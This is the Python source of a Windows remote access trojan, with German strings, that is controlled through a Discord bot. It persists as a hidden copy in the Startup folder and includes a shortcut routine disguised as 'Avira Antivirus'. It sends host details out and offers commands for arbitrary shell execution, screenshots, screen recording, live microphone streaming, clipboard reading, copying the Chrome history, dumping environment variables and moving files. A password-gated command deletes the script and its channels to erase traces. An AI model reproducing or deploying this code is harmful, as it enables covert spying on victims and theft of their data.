
import os
import platform
import socket
import subprocess
import psutil
import tempfile
import shutil
import time
import threading
import datetime
import getpass
import win32clipboard
import winreg
from dotenv import load_dotenv
import discord
from discord.ext import commands
import pyaudio
import pyautogui
import signal
import tempfile
import base64
import sys
import ctypes


load_dotenv()
encoded_token = "YXNk"

TOKEN = base64.b64decode(encoded_token).decode()

EXPLODE_PASSWORD = "ASD"
CATEGORY_NAME = platform.node()
LOG_FILE = "log.txt"
CHANNEL_NAMES = ["info", "main", "spam", "recordings", "file-related", "log"]

RECORD_FOLDER = os.path.join(tempfile.gettempdir(), "screen_recordings")
ffmpeg_process = None

def start_recording():
    """Startet oder restarted die Hintergrundaufnahme mit ffmpeg."""
    global ffmpeg_process
    if not os.path.exists(RECORD_FOLDER):
        os.makedirs(RECORD_FOLDER)
    cmd = [
        "ffmpeg", "-y",
        "-f", "gdigrab", "-framerate", "30", "-i", "desktop",
        "-c:v", "libx264", "-preset", "ultrafast",
        "-f", "segment", "-segment_time", "120", "-reset_timestamps", "1",
        os.path.join(RECORD_FOLDER, "recording_%03d.mp4")
    ]

    try:
        if ffmpeg_process and ffmpeg_process.poll() is None:
            ffmpeg_process.send_signal(signal.SIGINT)
            ffmpeg_process.wait()
    except:
        pass
    ffmpeg_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def get_latest_recording():
    """Gibt den Pfad zur neuesten MP4-Datei im RECORD_FOLDER zurück."""
    files = sorted(
        [f for f in os.listdir(RECORD_FOLDER) if f.endswith(".mp4")],
        key=lambda x: os.path.getmtime(os.path.join(RECORD_FOLDER, x))
    )
    return os.path.join(RECORD_FOLDER, files[-1]) if files else None

def add_to_autostart(exe_path, shortcut_name="Avira Antivirus"):

    autostart_folder = os.path.join(
        os.getenv('APPDATA'), r"Microsoft\Windows\Start Menu\Programs\Startup"
    )


    shortcut_path = os.path.join(autostart_folder, f"{shortcut_name}.lnk")


    try:
        import win32com.client
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.Targetpath = exe_path
        shortcut.WorkingDirectory = os.path.dirname(exe_path)
        shortcut.IconLocation = exe_path
        shortcut.save()
        print(f"Verknüpfung wurde zu Autostart hinzugefügt: {shortcut_path}")
    except Exception as e:
        print(f"Fehler beim Hinzufügen zu Autostart: {e}")


intents = discord.Intents.all()
bot = commands.Bot(command_prefix=".", intents=intents, help_command=None)


async def send_output(ctx, content=None, file_path=None, channel_name="main"):
    guild = ctx.guild
    category = discord.utils.get(guild.categories, name=CATEGORY_NAME)
    out_ch = discord.utils.get(category.channels, name=channel_name)
    log_ch = discord.utils.get(category.channels, name="log")

    if content:
        msg = content if len(content) <= 1900 else f"{content[:1900]}"
        await out_ch.send(msg)
        await log_ch.send(f"[{channel_name}] {ctx.command} von {ctx.author}: {msg[:200]}")
    elif file_path:
        await out_ch.send(file=discord.File(file_path))
        await log_ch.send(f"[{channel_name}] {ctx.command} von {ctx.author}: Datei {os.path.basename(file_path)} gesendet.")
        os.remove(file_path)


@bot.listen()
async def on_command(ctx):
    guild = ctx.guild
    category = discord.utils.get(guild.categories, name=CATEGORY_NAME)
    log_ch = discord.utils.get(category.channels, name="log")
    if log_ch:
        await log_ch.send(f"🔹 {ctx.author} hat .{ctx.command} ausgeführt um {datetime.datetime.now().strftime('%H:%M:%S')}")

@bot.event
async def on_ready():
    print(f"Bot gestartet als {bot.user.name}")
    guild = bot.guilds[0]

    category = discord.utils.get(guild.categories, name=CATEGORY_NAME)
    if not category:
        category = await guild.create_category(CATEGORY_NAME)
    for cname in CHANNEL_NAMES:
        if not discord.utils.get(category.channels, name=cname):
            await guild.create_text_channel(cname, category=category)


    info_ch = discord.utils.get(category.channels, name="info")
    ip = socket.gethostbyname(socket.gethostname())
    info_text = (
        f"**System gestartet:**\n"
        f"IP: {ip}\n"
        f"Name: {platform.node()}\n"
        f"OS: {platform.system()} {platform.release()}\n"
        f"User: {getpass.getuser()}\n"
        f"CPU: {platform.processor()}\n"
        f"RAM: {round(psutil.virtual_memory().total/(1024**3),2)} GB"
    )
    await info_ch.send(info_text)


   # start_recording()

def add_to_startup():
    import os, shutil, sys, subprocess
    startup = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    exe = os.path.basename(sys.argv[0])
    dest = os.path.join(startup, exe)
    if not os.path.exists(dest):
        shutil.copy2(sys.argv[0], dest)
        try:
            subprocess.call(['attrib', '+H', dest]) 
        except:
            pass




@bot.command(help="Zeigt alle verfügbaren Befehle")
async def help(ctx):
    cmds = [f".{c.name} – {c.help}" for c in bot.commands]
    await send_output(ctx, content="**Verfügbare Befehle:**\n" + "\n".join(cmds))

@bot.command(help="Macht Screenshot")
async def ss(ctx):
    temp = os.path.join(tempfile.gettempdir(), "ss.png")
    pyautogui.screenshot(temp)
    await send_output(ctx, file_path=temp)

@bot.command(help="Listet Dateien im Verzeichnis")
async def ls(ctx):
    files = os.listdir()
    path = os.path.join(tempfile.gettempdir(), "ls.txt")
    with open(path, "w", encoding="utf-8") as f:
        f.write("\n".join(files))
    await send_output(ctx, file_path=path)

@bot.command(help="Zeigt angemeldete Benutzer")
async def users(ctx):
    us = [u.name for u in psutil.users()]
    await send_output(ctx, content="Angemeldete Benutzer:\n" + "\n".join(us))

@bot.command(help="Download einer Datei")
async def download(ctx, *, filename):
    if os.path.exists(filename):
        await send_output(ctx, file_path=filename, channel_name="file-related")
    else:
        await send_output(ctx, content="Datei nicht gefunden.")

@bot.command(help="Upload einer Datei")
async def upload(ctx):
    if ctx.message.attachments:
        os.makedirs("uploads", exist_ok=True)
        for att in ctx.message.attachments:
            path = os.path.join("uploads", att.filename)
            await att.save(path)
            await send_output(ctx, content=f"Datei {att.filename} gespeichert.", channel_name="file-related")
    else:
        await send_output(ctx, content="Bitte Datei anhängen.")

@bot.command(help="Zeigt aktuellen Benutzer")
async def whoami(ctx):
    await send_output(ctx, content=getpass.getuser())

@bot.command(help="Zeigt Arbeitsverzeichnis")
async def cwd(ctx):
    await send_output(ctx, content=os.getcwd())

@bot.command(help="Zeigt System-Uptime")
async def uptime(ctx):
    up = time.time() - psutil.boot_time()
    await send_output(ctx, content=str(datetime.timedelta(seconds=int(up))))

@bot.command(help="Misst Latenz")
async def ping(ctx):
    await send_output(ctx, content=f"Pong! {round(bot.latency*1000)}ms")

@bot.command(help="Listet Umgebungsvariablen")
async def envdump(ctx):
    path = os.path.join(tempfile.gettempdir(), "envdump.txt")
    with open(path, "w", encoding="utf-8") as f:
        for k,v in os.environ.items():
            f.write(f"{k}={v}\n")
    await send_output(ctx, file_path=path)

@bot.command(help="Löscht Log-Datei")
async def cleanlogs(ctx):
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)
    await send_output(ctx, content="Logs gelöscht.")

@bot.command(help="Netzwerkverbindungen")
async def netstat(ctx):
    lines = [f"{c.laddr}->{c.raddr}[{c.status}]" for c in psutil.net_connections() if c.raddr]
    path = os.path.join(tempfile.gettempdir(), "netstat.txt")
    with open(path, "w") as f:
        f.write("\n".join(lines))
    await send_output(ctx, file_path=path)

@bot.command(help="Zeigt RAM-Auslastung")
async def ram(ctx):
    m = psutil.virtual_memory()
    await send_output(ctx, content=f"RAM: {m.used//(1024**2)}/{m.total//(1024**2)} MB")

@bot.command(help="Zeigt CPU-Auslastung")
async def cpu(ctx):
    usage = psutil.cpu_percent(interval=1, percpu=True)
    await send_output(ctx, content="\n".join([f"Kern{i}: {u}%" for i,u in enumerate(usage)]))

@bot.command(help="Zeigt Festplattennutzung")
async def disk(ctx):
    lines = []
    for p in psutil.disk_partitions():
        u = psutil.disk_usage(p.mountpoint)
        lines.append(f"{p.device}: {u.percent}%")
    await send_output(ctx, content="\n".join(lines))

@bot.command(help="Zeigt Makros")
async def macros(ctx):
    await send_output(ctx, content="Keine Makros registriert.")

@bot.command(help="Scannt lokale Ports")
async def scanports(ctx):
    open_p = []
    for port in range(1,1025):
        with socket.socket() as s:
            s.settimeout(0.1)
            if s.connect_ex(("127.0.0.1",port)) == 0:
                open_p.append(str(port))
    await send_output(ctx, content="Offene Ports: " + ",".join(open_p))


@bot.command()
async def processes(ctx):
    ignored = {
        'system idle process', 'system', 'svchost.exe', 'wininit.exe', 'csrss.exe',
        'smss.exe', 'winlogon.exe', 'services.exe'
    }

    process_list = []
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            name = proc.info['name'].lower()
            if name in ignored:
                continue
            process_list.append(f"{proc.info['pid']:>6} - {proc.info['name']}")
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

    with open("processes.txt", "w", encoding="utf-8") as f:
        f.write("Aktive Prozesse (gefiltert):\n\n")
        f.write("\n".join(process_list))

    await ctx.send(file=discord.File("processes.txt"))
@bot.command(help="Beendet Prozess")
async def kill(ctx, pid: int):
    try:
        p = psutil.Process(pid)
        n = p.name()
        p.terminate()
        msg = f"Beendet {pid}:{n}"
        with open(LOG_FILE, "a") as f:
            f.write(f"{datetime.datetime.now()} {msg}\n")
        await send_output(ctx, content=msg)
    except Exception as e:
        await send_output(ctx, content=f"Error {e}")

@bot.command(help="Anzeige Log-Einträge")
async def log(ctx):
    await send_output(ctx, content="Logs im log-Channel einsehen.", channel_name="log")

@bot.command(help="Führt CMD aus")
async def cmd(ctx, *, befehl):
    res = subprocess.run(befehl, shell=True, capture_output=True, text=True)
    out = res.stdout + res.stderr
    with open(LOG_FILE, "a") as f:
        f.write(f"{datetime.datetime.now()} CMD {befehl}\n{out}\n")
    await send_output(ctx, content=out)

@bot.command(help="Chrome-Verlauf")
async def history(ctx):
    path = os.path.expanduser(
        "~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
    )
    if not os.path.exists(path):
        return await send_output(ctx, content="Verlauf nicht gefunden.")
    tmp = os.path.join(tempfile.gettempdir(), "hist_copy")
    shutil.copy2(path, tmp)
    await send_output(ctx, file_path=tmp)

@bot.command(help="Sendet Zwischenablage")
async def clipboard(ctx):
    win32clipboard.OpenClipboard()
    try:
        data = win32clipboard.GetClipboardData()
    except:
        data = "Fehler beim Auslesen"
    win32clipboard.CloseClipboard()
    await send_output(ctx, content=str(data))

@bot.command(help="Autostart-Programme")
async def autostarts(ctx):
    ents = []
    for root,name in [(winreg.HKEY_LOCAL_MACHINE,"HKLM"),(winreg.HKEY_CURRENT_USER,"HKCU")]:
        try:
            key = winreg.OpenKey(root, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run")
            i = 0
            while True:
                val = winreg.EnumValue(key, i)
                ents.append(f"{name}: {val[0]}")
                i += 1
        except:
            break
    await send_output(ctx, content="\n".join(ents[:50]))

@bot.command(help="Tritt Sprachkanal 'live' bei und überträgt Mikrofon")
async def join(ctx):
    if not ctx.author.voice:
        return await send_output(ctx, content="Du bist in keinem Sprachkanal.")
    voice_ch = ctx.author.voice.channel
    if voice_ch.name.lower() != "live":
        return await send_output(ctx, content="Nutze den Sprachkanal 'live' für diesen Befehl.")
    vc = await voice_ch.connect()

    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 48000

    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE,
                    input=True, frames_per_buffer=CHUNK, input_device_index=None)

    class MicSource(discord.AudioSource):
        def read(self):
            return stream.read(CHUNK, exception_on_overflow=False)
        def is_opus(self):
            return False

    vc.play(MicSource())
    await send_output(ctx, content="🎙️ Mikrofonübertragung gestartet.")

@bot.command(help="Bot verlässt den Sprachkanal")
async def leave(ctx):
    if ctx.voice_client:
        await ctx.voice_client.disconnect()
        await send_output(ctx, content="🔌 Bot hat den Sprachkanal verlassen.")
    else:
        await send_output(ctx, content="❌ Bot ist in keinem Sprachkanal verbunden.")

@bot.command(help="Sendet & restarts Aufnahme")
async def record(ctx):
    global ffmpeg_process
  
    if ffmpeg_process:
        ffmpeg_process.terminate()      # send_signal(SIGINT)
        ffmpeg_process.wait()
 
    latest = get_latest_recording()
    if latest:
        await send_output(ctx, file_path=latest, channel_name="recordings")
    else:
        await send_output(ctx, content="Keine Aufnahme gefunden.", channel_name="main")
  
    start_recording()


@bot.command(help="Löscht alle Spuren (Channels + Skript)")
async def explode(ctx, *, password):
    global EXPLODE_PASSWORD
    if password != EXPLODE_PASSWORD:
        return await send_output(ctx, content="Falsches Passwort.")
    EXPLODE_PASSWORD = None
    guild = ctx.guild
    category = discord.utils.get(guild.categories, name=CATEGORY_NAME)
    if category:
        for ch in category.channels:
            await ch.delete()
        await category.delete()
    try:
        os.remove(__file__)
    except:
        pass
    await send_output(ctx, content="Self-Destruct abgeschlossen.")
    await bot.close()

if __name__ == "__main__":
    exe_path = os.path.abspath(sys.argv[0])
    add_to_startup()
    bot.run(TOKEN)
